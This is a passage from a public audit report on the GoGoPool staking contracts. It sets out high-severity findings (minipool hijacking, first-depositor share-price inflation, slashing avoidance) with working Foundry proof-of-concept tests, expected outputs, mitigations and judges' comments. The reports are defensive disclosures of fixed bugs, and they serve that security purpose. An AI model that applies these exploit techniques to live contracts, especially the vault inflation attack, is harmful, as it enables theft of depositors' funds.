                 │                           │                        │     │Hacker loses no│    │
                 │                           │                        │     │funds, can     │    │
                 │                           │                        │     │withdraw GPP   │    │
                 │                           │                        │     └───────────────┘    │

***Scenario #2 - Use node of node operator***

In this scenario the NodeOp registers for a duration longer then 14 days. The hacker will hijack the minipool after 14 days and earn rewards on behalf of the node operators node for the rest of the duration.<br>
As the NodeOp registers for a longer period of time, it is likely he will not notice he is not the owner of the minipool and continue to use his node to validate Avalanche.

Results:

1.  Node operator will lose all his staked AVAX
2.  Hacker will gain rewards for staking without hosting a node

Important to note:

*   This scenario is only possible if `recordStakingEnd` and `recreateMinipool` are **not** called in the same transaction by `rialto`.
*   During the research the sponsor has elaborated that they plan to perform the calls in the same transaction.
*   The sponsor requested to submit issues related to `recordStakingEnd` and `recreateMinipool` single/multi transactions for information and clarity anyway.

Consider the following steps:

1.  Hacker creates a node and creates a minipool `node-1337`.
2.  NodeOp registers a nodeID `node-123` for 28 days duration and finished the 14 days stake period. State is `Withdrawable`.
3.  Hacker calls `createMinipool` with `node-1234` and deposits 1000 AVAX. Hacker is now owner of minipool
4.  Rialto calls `recreateMinipool` to restake the minipool in Avalanche. (This time: the owner is the hacker, the hardware is NodeOp)
5.  14 days have passed, hacker can withdraw the rewards and 1000 staked AVAX
6.  NodeOps cannot withdraw staked AVAX.

**Foundry POC**

The POC will demonstrate scenario #1.

Add the following test to `MinipoolManager.t.sol`: <br><https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/MinipoolManager.t.sol#L175>

    	function testHijackMinipool() public {
    		uint256 duration = 2 weeks;
    		uint256 depositAmt = 1000 ether;
    		uint256 avaxAssignmentRequest = 1000 ether;
    		uint256 rewards = 10 ether;
    		uint256 expectedRewards = (rewards/2)+(rewards/2).mulWadDown(dao.getMinipoolNodeCommissionFeePct());
    		uint256 validationAmt = depositAmt + avaxAssignmentRequest;
    		uint128 ggpStakeAmt = 100 ether;
    		address hacker = address(0x1337);
    		// Fund hacker with exact AVAX and gpp
    		vm.deal(hacker, depositAmt*2);
    		dealGGP(hacker, ggpStakeAmt);
    		// Fund nodeOp with exact AVAX and gpp
    		nodeOp = address(0x123);
    		vm.deal(nodeOp, depositAmt);
    		dealGGP(nodeOp, ggpStakeAmt);

    		// fund ggAVAX
    		address lilly = getActorWithTokens("lilly", MAX_AMT, MAX_AMT);
    		vm.prank(lilly);
    		ggAVAX.depositAVAX{value: MAX_AMT}();
    		assertEq(lilly.balance, 0);

    		vm.startPrank(hacker);
    		// Hacker stakes GGP
    		ggp.approve(address(staking), ggpStakeAmt);
    		staking.stakeGGP(ggpStakeAmt);

    		// Create minipool for hacker
    		MinipoolManager.Minipool memory hackerMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    		vm.stopPrank();

    		vm.startPrank(nodeOp);
    		// nodeOp stakes GGP
    		ggp.approve(address(staking), ggpStakeAmt);
    		staking.stakeGGP(ggpStakeAmt);

    		// Create minipool for nodeOp
    		MinipoolManager.Minipool memory nodeOpMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    		vm.stopPrank();

    		// Rialto stakes both hackers and nodeOp in avalanche 
    		vm.startPrank(address(rialto));
    		minipoolMgr.claimAndInitiateStaking(nodeOpMp.nodeID);
    		minipoolMgr.claimAndInitiateStaking(hackerMp.nodeID);

    		// Update that staking has started
    		bytes32 txID = keccak256("txid");
    		minipoolMgr.recordStakingStart(nodeOpMp.nodeID, txID, block.timestamp);
    		minipoolMgr.recordStakingStart(hackerMp.nodeID, txID, block.timestamp);

    		// Skip 14 days of staking duration
    		skip(duration);

    		// Update that staking has ended and funds are withdrawable
    		minipoolMgr.recordStakingEnd{value: validationAmt + rewards}(nodeOpMp.nodeID, block.timestamp, 10 ether);
    		minipoolMgr.recordStakingEnd{value: validationAmt + rewards}(hackerMp.nodeID, block.timestamp, 10 ether);
    		vm.stopPrank();

    		/// NOW STATE: WITHDRAWABLE ///

    		vm.startPrank(hacker);
    		// Hacker creates a minipool using nodeID of nodeOp
    		// Hacker is now the owner of nodeOp minipool
    		minipoolMgr.createMinipool{value: depositAmt}(nodeOpMp.nodeID, duration, 0.02 ether, avaxAssignmentRequest);

    		// Hacker immediatally cancels the nodeOp minipool, validate 1000 AVAX returned
    		minipoolMgr.cancelMinipool(nodeOpMp.nodeID);
    		assertEq(hacker.balance, depositAmt);
    		// Hacker withdraws his own minipool and receives 1000 AVAX + rewards
    		minipoolMgr.withdrawMinipoolFunds(hackerMp.nodeID);
    		assertEq(hacker.balance, depositAmt + depositAmt + expectedRewards);

    		// Hacker withdraws his staked ggp
    		staking.withdrawGGP(ggpStakeAmt);
    		assertEq(ggp.balanceOf(hacker), ggpStakeAmt);
    		vm.stopPrank();

    		vm.startPrank(nodeOp);
    		// NodeOp tries to withdraw his funds from the minipool
    		// Transaction reverts because NodeOp is not the owner anymore
    		vm.expectRevert(MinipoolManager.OnlyOwner.selector);
    		minipoolMgr.withdrawMinipoolFunds(nodeOpMp.nodeID);

    		// NodeOp can still release his staked gpp
    		staking.withdrawGGP(ggpStakeAmt);
    		assertEq(ggp.balanceOf(nodeOp), ggpStakeAmt);
    		vm.stopPrank();
    	}

To run the POC, execute:

    forge test -m testHijackMinipool -v

Expected output:

    Running 1 test for test/unit/MinipoolManager.t.sol:MinipoolManagerTest
    [PASS] testHijackMinipool() (gas: 2346280)
    Test result: ok. 1 passed; 0 failed; finished in 9.63s

### Tools Used

VS Code, Foundry

### Recommended Mitigation Steps

Fortunately, the fix is very simple.<br>
The reason `createMinipool` is called with an existing `nodeID` is to re-use the `nodeID` again with the protocol. GoGoPool can validate that the owner is the same address as the calling address. GoGoPool have already implemented a function that does this: `onlyOwner(index)`.

Consider placing `onlyOwner(index)` in the following area: <br><https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L243>

    	function createMinipool(
    		address nodeID,
    		uint256 duration,
    		uint256 delegationFee,
    		uint256 avaxAssignmentRequest
    	) external payable whenNotPaused {
    ----------
    		int256 minipoolIndex = getIndexOf(nodeID);
    		if (minipoolIndex != -1) {
                            onlyOwner(minipoolIndex); // AUDIT: ADDED HERE
    ----------
    		} else {
    ----------
    	}

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/213#issuecomment-1410348485):**
 > The Warden has shown how, due to a lax check for State Transition, a Pool ID can be hijacked, causing the loss of the original deposit
> 
> Because the attack is contingent on a logic flaw and can cause a complete loss of Principal, I agree with High Severity.
>
 > Separate note: I created [issue 904](https://github.com/code-423n4/2022-12-gogopool-findings/issues/904). For the Finding 2 of this report, please refrain from grouping findings especially when they use different functions and relate to different issues.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Atomically recreate minipool to not allow hijack: [multisig-labs/gogopool#23](https://github.com/multisig-labs/gogopool/pull/23)

**Status:** Mitigation confirmed, but a new medium severity issue was found. Full details in [report from hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/23), and also included in Mitigation Review section below.



***

## [[H-05] Inflation of ggAVAX share price by first depositor](https://github.com/code-423n4/2022-12-gogopool-findings/issues/209)
*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/209), also found by [eierina](https://github.com/code-423n4/2022-12-gogopool-findings/issues/872), [ak1](https://github.com/code-423n4/2022-12-gogopool-findings/issues/853), [datapunk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/832), [0xNazgul](https://github.com/code-423n4/2022-12-gogopool-findings/issues/815), [Qeew](https://github.com/code-423n4/2022-12-gogopool-findings/issues/801), [Breeje](https://github.com/code-423n4/2022-12-gogopool-findings/issues/775), [SamGMK](https://github.com/code-423n4/2022-12-gogopool-findings/issues/770), [IllIllI](https://github.com/code-423n4/2022-12-gogopool-findings/issues/736), [TomJ](https://github.com/code-423n4/2022-12-gogopool-findings/issues/672), [sces60107](https://github.com/code-423n4/2022-12-gogopool-findings/issues/663), [WatchDogs](https://github.com/code-423n4/2022-12-gogopool-findings/issues/658), [Arbor-Finance](https://github.com/code-423n4/2022-12-gogopool-findings/issues/607), [SmartSek](https://github.com/code-423n4/2022-12-gogopool-findings/issues/588), [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/573), [tonisives](https://github.com/code-423n4/2022-12-gogopool-findings/issues/527), [peanuts](https://github.com/code-423n4/2022-12-gogopool-findings/issues/456), [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/411), [0xSmartContract](https://github.com/code-423n4/2022-12-gogopool-findings/issues/389), [fs0c](https://github.com/code-423n4/2022-12-gogopool-findings/issues/379), [ck](https://github.com/code-423n4/2022-12-gogopool-findings/issues/336), [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/319), [yongskiws](https://github.com/code-423n4/2022-12-gogopool-findings/issues/285), [0xLad](https://github.com/code-423n4/2022-12-gogopool-findings/issues/204), [btk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/187), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/179), [koxuan](https://github.com/code-423n4/2022-12-gogopool-findings/issues/155), [ladboy233](https://github.com/code-423n4/2022-12-gogopool-findings/issues/147), [Rolezn](https://github.com/code-423n4/2022-12-gogopool-findings/issues/96), [HE1M](https://github.com/code-423n4/2022-12-gogopool-findings/issues/68), [yongskiws](https://github.com/code-423n4/2022-12-gogopool-findings/issues/39), [SEVEN](https://github.com/code-423n4/2022-12-gogopool-findings/issues/37), and [dic0de](https://github.com/code-423n4/2022-12-gogopool-findings/issues/14)*

Inflation of `ggAVAX` share price can be done by depositing as soon as the vault is created.

Impact:

1.  Early depositor will be able steal other depositors funds
2.  Exchange rate is inflated. As a result depositors are not able to deposit small funds.

### Proof of Concept

If `ggAVAX` is not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share.<br>
The depositor can donate WAVAX to the vault and call `syncRewards`. This will start inflating the price.

When the attacker front-runs the creation of the vault, the attacker:

1.  Calls `depositAVAX` to receive 1 share
2.  Transfers `WAVAX` to `ggAVAX`
3.  Calls `syncRewards` to inflate exchange rate

The issue exists because the exchange rate is calculated as the ratio between the `totalSupply` of shares and the `totalAssets()`.<br>
When the attacker transfers `WAVAX` and calls `syncRewards()`, the `totalAssets()` increases gradually and therefore the exchange rate also increases.

` convertToShares  `: <https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123>

    	function convertToShares(uint256 assets) public view virtual returns (uint256) {
    		uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    		return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    	}

Its important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days.
This is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).

`syncRewards`: <https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102>

    	function syncRewards() public {
    ----------
    		// Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.
    		uint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;
    ---------
    	}

Therefore:

*   The closer the call to `syncRewards` is to the next evenly divisible value of `rewardsCycleLength`, the closer the next  `rewardsCycleEnd` will be.
*   The closer the delta between `syncRewards` calls is, the higher revenue the attacker will get.

Edge case example:<br>
`syncRewards` is called with the timestamp 1672876799, `syncRewards` will be able to be called again 1 second later.
`(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800`

Additionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.

`depositAVAX`: <https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166>

    	function depositAVAX() public payable returns (uint256 shares) {
    ------
    		if ((shares = previewDeposit(assets)) == 0) {
    			revert ZeroShares();
    		}
    ------
    	}

`previewDeposit` and ` convertToShares  `:<br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123>

    	function convertToShares(uint256 assets) public view virtual returns (uint256) {
    		uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    		return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    	}
    	function previewDeposit(uint256 assets) public view virtual returns (uint256) {
    		return convertToShares(assets);
    	}

**Foundry POC**

The POC will demonstrate the below scenario:

1.  Bob front-runs the vault creation.
2.  Bob deposits 1 WEI of AVAX to the vault.
3.  Bob transfers 1000 WAVAX to the vault.
4.  Bob calls `syncRewards` when block.timestamp = `1672876799`.
5.  Bob waits 1 second.
6.  Bob calls `syncRewards` again. Share price fully inflated.
7.  Alice deposits 2000 AVAX to vault.
8.  Bob withdraws 1500 AVAX (steals 500 AVAX from Alice).
9.  Alice share earns her 1500 AVAX (although she deposited 2000).

Additionally, the POC will show that depositors trying to deposit less then the donation amount will revert.

Add the following test to `TokenggAVAX.t.sol`: <https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108>

    	function testShareInflation() public {
    		uint256 depositAmount = 1;
    		uint256 aliceDeposit = 2000 ether;
    		uint256 donationAmount = 1000 ether;
    		vm.deal(bob, donationAmount  + depositAmount);
    		vm.deal(alice, aliceDeposit);
    		vm.warp(1672876799);

    		// create new ggAVAX
    		ggAVAXImpl = new TokenggAVAX();
    		ggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));
    		ggAVAX.initialize(store, ERC20(address(wavax)));

    		// Bob deposits 1 WEI of AVAX
    		vm.prank(bob);
    		ggAVAX.depositAVAX{value: depositAmount}();
    		// Bob transfers 1000 AVAX to vault
    		vm.startPrank(bob);
    		wavax.deposit{value: donationAmount}();
    		wavax.transfer(address(ggAVAX), donationAmount);
    		vm.stopPrank();
    		// Bob Syncs rewards
    		ggAVAX.syncRewards();

    		// 1 second has passed
    		// This can range between 0-14 days. Every seconds, exchange rate rises
    		skip(1 seconds);

    		// Alice deposits 2000 AVAX
    		vm.prank(alice);
    		ggAVAX.depositAVAX{value: aliceDeposit}();

    		//Expectet revert when any depositor deposits less then 1000 AVAX
    		vm.expectRevert(bytes4(keccak256("ZeroShares()")));
    		ggAVAX.depositAVAX{value: 10 ether}();

    		// Bob withdraws maximum assests for his share
    		uint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);
    		vm.prank(bob);
    		ggAVAX.withdrawAVAX(maxWithdrawAssets);

    		//Validate bob has withdrawn 1500 AVAX 
    		assertEq(bob.balance, 1500 ether);

    		// Alice withdraws maximum assests for her share
    		maxWithdrawAssets = ggAVAX.maxWithdraw(alice);
    		ggAVAX.syncRewards(); // to update accounting
    		vm.prank(alice);
    		ggAVAX.withdrawAVAX(maxWithdrawAssets);

    		// Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)
    		assertEq(alice.balance, 1500 ether + 1);
    	}

To run the POC, execute:

    forge test -m testShareInflation -v

Expected output:

    Running 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest
    [PASS] testShareInflation() (gas: 3874399)
    Test result: ok. 1 passed; 0 failed; finished in 8.71s

### Tools Used

VS Code, Foundry

### Recommended Mitigation Steps

When creating the vault add initial funds in order to make it harder to inflate the price.
Best practice would add initial funds as part of the initialization of the contract (to prevent front-running).

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/209#issuecomment-1379257413)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/209#issuecomment-1407738455):**
 > The Warden has shown how, by performing a small deposit, followed by a transfer, shares can be rebased, causing a grief in the best case, and complete fund loss in the worst case for every subsequent depositor.
> 
> While the finding is fairly known, it's impact should not be understated, and because of this I agree with High Severity.
> 
> I recommend watching this presentation by Riley Holterhus which shows possible mitigations for the attack:
> https://youtu.be/_pO2jDgL0XE?t=601

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Initialize ggAVAX with a deposit: [multisig-labs/gogopool#49](https://github.com/multisig-labs/gogopool/pull/49)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/5) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/24).



***

## [[H-06] MinipoolManager: node operator can avoid being slashed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/136)
*Submitted by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/136), also found by [enckrish](https://github.com/code-423n4/2022-12-gogopool-findings/issues/743), [imare](https://github.com/code-423n4/2022-12-gogopool-findings/issues/709), [bin2chen](https://github.com/code-423n4/2022-12-gogopool-findings/issues/525), [danyams](https://github.com/code-423n4/2022-12-gogopool-findings/issues/321), [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/221), [cozzetti](https://github.com/code-423n4/2022-12-gogopool-findings/issues/186), and [ladboy233](https://github.com/code-423n4/2022-12-gogopool-findings/issues/128)*

When staking is done, a Rialto multisig calls `MinipoolManager.recordStakingEnd` (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440>).

If the `avaxTotalRewardAmt` has the value zero, the `MinipoolManager` will slash the node operator's GGP.

The issue is that the amount to slash can be greater than the GGP balance the node operator has staked.

This will cause the call to `MinipoolManager.recordStakingEnd` to revert because an underflow is detected.

This means a node operator can create a minipool that cannot be slashed.

A node operator must provide at least 10% of `avaxAssigned` as collateral by staking GGP.

It is assumed that a node operator earns AVAX at a rate of 10% per year.

So if a Minipool is created with a duration of `> 365 days`, the 10% collateral is not sufficient to pay the expected rewards.

This causes the function call to revert.

Another cause of the revert can be that the GGP price in AVAX changes. Specifically if the GGP price falls, there needs to be slashed more GGP.

Therefore if the GGP price drops enough it can cause the call to slash to revert.

I think it is important to say that with any collateralization ratio this can happen. The price of GGP must just drop enough or one must use a long enough duration.

The exact impact of this also depends on how the Rialto multisig handles failed calls to `MinipoolManager.recordStakingEnd`.

It looks like if this happens, `MinipoolManager.recordStakingError` (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515>) is called.

This allows the node operator to withdraw his GGP stake.

**So in summary a node operator can create a Minipool that cannot be slashed and probably remove his GGP stake when it should have been slashed.**

### Proof of Concept

When calling `MinipoolManager.recordStakingEnd` (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440>) and the `avaxTotalRewardAmt` parameter is zero, the node operator is slashed:

```solidity
// No rewards means validation period failed, must slash node ops GGP.
if (avaxTotalRewardAmt == 0) {
    slash(minipoolIndex);
}
```

The `MinipoolManager.slash` function (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683>) then calculates `expectedAVAXRewardsAmt` and from this `slashGGPAmt`:

```solidity
uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));
uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);
uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);
```

Downstream there is then a revert due to underflow because of the following line in `Staking.decreaseGGPStake` (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97>):

```solidity
subUint(keccak256(abi.encodePacked("staker.item", stakerIndex, ".ggpStaked")), amount);
```

You can add the following foundry test to `MinipoolManager.t.sol`:

```solidity
function testRecordStakingEndWithSlashFail() public {
    uint256 duration = 366 days;
    uint256 depositAmt = 1000 ether;
    uint256 avaxAssignmentRequest = 1000 ether;
    uint256 validationAmt = depositAmt + avaxAssignmentRequest;
    uint128 ggpStakeAmt = 100 ether;

    vm.startPrank(nodeOp);
    ggp.approve(address(staking), MAX_AMT);
    staking.stakeGGP(ggpStakeAmt);
    MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    vm.stopPrank();

    address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
    vm.prank(liqStaker1);
    ggAVAX.depositAVAX{value: MAX_AMT}();

    vm.prank(address(rialto));
    minipoolMgr.claimAndInitiateStaking(mp1.nodeID);

    bytes32 txID = keccak256("txid");
    vm.prank(address(rialto));
    minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

    vm.startPrank(address(rialto));

    skip(duration);

    minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether);
}
```

See that it runs successfully with `duration = 365 days` and fails with `duration = 366 days`.

The similar issue occurs when the GGP price drops. I chose to implement the test with `duration` as the cause for the underflow because your tests use a fixed AVAX/GGP price.

### Tools Used

VSCode, Foundry

### Recommended Mitigation Steps

You should check if the amount to be slashed is greater than the node operator's GGP balance. If this is the case, the amount to be slashed should be set to the node operator's GGP balance.

I believe this check can be implemented within the `MinipoolManager.slash` function without breaking any of the existing accounting logic.

```solidity
function slash(int256 index) private {
    address nodeID = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".nodeID")));
    address owner = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".owner")));
    uint256 duration = getUint(keccak256(abi.encodePacked("minipool.item", index, ".duration")));
    uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));
    uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);
    uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);
    setUint(keccak256(abi.encodePacked("minipool.item", index, ".ggpSlashAmt")), slashGGPAmt);

    emit GGPSlashed(nodeID, slashGGPAmt);

    Staking staking = Staking(getContractAddress("Staking"));

    if (slashGGPAmt > staking.getGGPStake(owner)) {
        slashGGPAmt = staking.getGGPStake(owner);
    }
    
    staking.slashGGP(owner, slashGGPAmt);
}
```

**[emersoncloud (GoGoPool) confirmed, but commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/136#issuecomment-1380932948):**
 > This is a combination of two other issues from other wardens
> 
> 1. Slash amount shouldn't depend on duration: https://github.com/code-423n4/2022-12-gogopool-findings/issues/694
> 2. GGP Slash shouldn't revert: https://github.com/code-423n4/2022-12-gogopool-findings/issues/743

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/136#issuecomment-1415768955):**
 > This finding combines 2 issues:
> - If price drops Slash can revert -> Medium
> - Attacker can set Duration to too high to cause a revert -> High
> 
> Am going to dedupe this and the rest, but ultimately I think these are different findings, that should have been filed separately.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/136#issuecomment-1415772950):**
 > The Warden has shown how a malicious staker could bypass slashing, by inputting a duration that is beyond the intended amount.
> 
> Other reports have shown how to sidestep the slash or reduce it, however, this report shows how the bypass can be enacted maliciously to break the protocol functionality, to the attacker's potential gain.
> 
> Because slashing is sidestepped in it's entirety, I believe this finding to be of High Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > If staked GGP doesn't cover slash amount, slash it all: [multisig-labs/gogopool#41](https://github.com/multisig-labs/gogopool/pull/41)

**Status:** Original finding mitigated, but a medium severity economical risk is still present. Full details in reports from [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6), [ladboy233](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/61) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/25). Also included in Mitigation Review section below.



***
 
# Medium Risk Findings (22)
## [[M-01] `RewardsPool.sol` : It is safe to have the `startRewardsCycle` with `WhenNotPaused` modifier](https://github.com/code-423n4/2022-12-gogopool-findings/issues/823)
*Submitted by [ak1](https://github.com/code-423n4/2022-12-gogopool-findings/issues/823), also found by [sces60107](https://github.com/code-423n4/2022-12-gogopool-findings/issues/745)*

When the contract is paused , allowing startRewardsCycle would inflate the token value which might not be safe.

Rewards should not be claimed by anyone when all other operations are paused.

I saw that the `witdrawGGP` has this `WhenNotPaused` modifier.

Inflate should not consider the paused duration.

Let's say, when the contract is paused for the duration of 2 months, then the dao, protocol, and node validator would enjoy the rewards. This is not good for a healthy protocol.

### Proof of Concept

startRewardsCycle does not have the WhenNotPaused modifier.

    function startRewardsCycle() external {
    	if (!canStartRewardsCycle()) {
    		revert UnableToStartRewardsCycle();
    	}


    	emit NewRewardsCycleStarted(getRewardsCycleTotalAmt());


    	// Set start of new rewards cycle
    	setUint(keccak256("RewardsPool.RewardsCycleStartTime"), block.timestamp);
    	increaseRewardsCycleCount();
    	// Mint any new tokens from GGP inflation
    	// This will always 'mint' (release) new tokens if the rewards cycle length requirement is met
    	// 		since inflation is on a 1 day interval and it needs at least one cycle since last calculation
    	inflate();


    	uint256 multisigClaimContractAllotment = getClaimingContractDistribution("ClaimMultisig");
    	uint256 nopClaimContractAllotment = getClaimingContractDistribution("ClaimNodeOp");
    	uint256 daoClaimContractAllotment = getClaimingContractDistribution("ClaimProtocolDAO");
    	if (daoClaimContractAllotment + nopClaimContractAllotment + multisigClaimContractAllotment > getRewardsCycleTotalAmt()) {
    		revert IncorrectRewardsDistribution();
    	}


    	TokenGGP ggp = TokenGGP(getContractAddress("TokenGGP"));
    	Vault vault = Vault(getContractAddress("Vault"));


    	if (daoClaimContractAllotment > 0) {
    		emit ProtocolDAORewardsTransfered(daoClaimContractAllotment);
    		vault.transferToken("ClaimProtocolDAO", ggp, daoClaimContractAllotment);
    	}


    	if (multisigClaimContractAllotment > 0) {
    		emit MultisigRewardsTransfered(multisigClaimContractAllotment);
    		distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp);
    	}


    	if (nopClaimContractAllotment > 0) {
    		emit ClaimNodeOpRewardsTransfered(nopClaimContractAllotment);
    		ClaimNodeOp nopClaim = ClaimNodeOp(getContractAddress("ClaimNodeOp"));
    		nopClaim.setRewardsCycleTotal(nopClaimContractAllotment);
    		vault.transferToken("ClaimNodeOp", ggp, nopClaimContractAllotment);
    	}
    }

### Recommended Mitigation Steps

We suggest to use `WhenNotPaused` modifier.

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/823)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/823#issuecomment-1415693372):**
 > The Warden has shown an inconsistency as to how Pausing is used.
> 
> While other aspects of the code are pausable and under the control of the `guardian`, a call to `startRewardsCycle` can be performed by anyone, and in the case of a system-wide pause may create unfair gains or lost rewards.
>
 > For this reason I agree with Medium Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Pause startRewardsCycle when protocol is paused: [multisig-labs/gogopool#22](https://github.com/multisig-labs/gogopool/pull/22)

**Status:** Mitigation confirmed with comments. Full details in [report from RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/12).



***

## [[M-02] Coding logic of the contract upgrading renders upgrading contracts impractical](https://github.com/code-423n4/2022-12-gogopool-findings/issues/742)
*Submitted by [gz627](https://github.com/code-423n4/2022-12-gogopool-findings/issues/742), also found by [Allarious](undefined), [ast3ros](undefined), [bin2chen](undefined), [brgltd](https://github.com/code-423n4/2022-12-gogopool-findings/issues/850), [hihen](https://github.com/code-423n4/2022-12-gogopool-findings/issues/782), [adriro](https://github.com/code-423n4/2022-12-gogopool-findings/issues/755), [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/747), [Czar102](https://github.com/code-423n4/2022-12-gogopool-findings/issues/746), [nogo](https://github.com/code-423n4/2022-12-gogopool-findings/issues/729), [nogo](https://github.com/code-423n4/2022-12-gogopool-findings/issues/724), [imare](https://github.com/code-423n4/2022-12-gogopool-findings/issues/706), [HE1M](https://github.com/code-423n4/2022-12-gogopool-findings/issues/698), [KmanOfficial](https://github.com/code-423n4/2022-12-gogopool-findings/issues/621), [neumo](https://github.com/code-423n4/2022-12-gogopool-findings/issues/558), [AkshaySrivastav](https://github.com/code-423n4/2022-12-gogopool-findings/issues/542), [betweenETHlines](https://github.com/code-423n4/2022-12-gogopool-findings/issues/479), [peanuts](https://github.com/code-423n4/2022-12-gogopool-findings/issues/465), [mookimgo](https://github.com/code-423n4/2022-12-gogopool-findings/issues/358), [cccz](https://github.com/code-423n4/2022-12-gogopool-findings/issues/335), 